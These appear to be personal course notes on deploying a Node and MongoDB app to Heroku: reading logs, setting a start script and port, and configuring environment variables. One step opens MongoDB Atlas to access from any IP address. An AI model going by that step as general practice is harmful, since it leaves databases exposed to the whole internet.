ex. git push heroku master






- CF.https://www.udemy.com/course/the-web-developer-bootcamp/learn/lecture/22361220#questions/13078722

- but it doesn't work yet!

<br>





#### 571. Fixing Heroku Error

- to see the error message logs,



~> heroku logs --tail

1. Heroku does not know how to start our app!
: so in package.json,
ex. "scripts": {
        ..,
        "start": "node app.js"
    }

: "name" should be all lowercase

2. Change the port
: in app.js
ex. const port = process.env.PORT || 3000
    //port # saved on Heroku!
ex. app.listen(port, ...)

: anytime we make changes, we should git add . and git commit -m "add start script! "

- still not working!

<br>











#### 572. Configuring Heroku Env Variables
- we gotta configure env variables!

1. FIRST WAY
- in Heroku website,
: specific app
: settings
: config vars
: then enter variables!

2. IN CLI

- heroku config: set SECRET = ...





: do this again


- still not working!

: we have to whitelist the IP accessing MongoDB Atlas

- back to MongoDB Atlas setting
: Access
: Add ip access list entry
: All access from anywhere!


- then heroku restart!

- after fixing all errors,
: THE APP IS FINALLY UP AND RUNNING!!! :D :D

- can "seed " the campgrounds if you want

(https://www.udemy.com/course/the-web-developer-bootcamp/learn/lecture/22361242#questions/13704006)










    




  










  




































  





























  







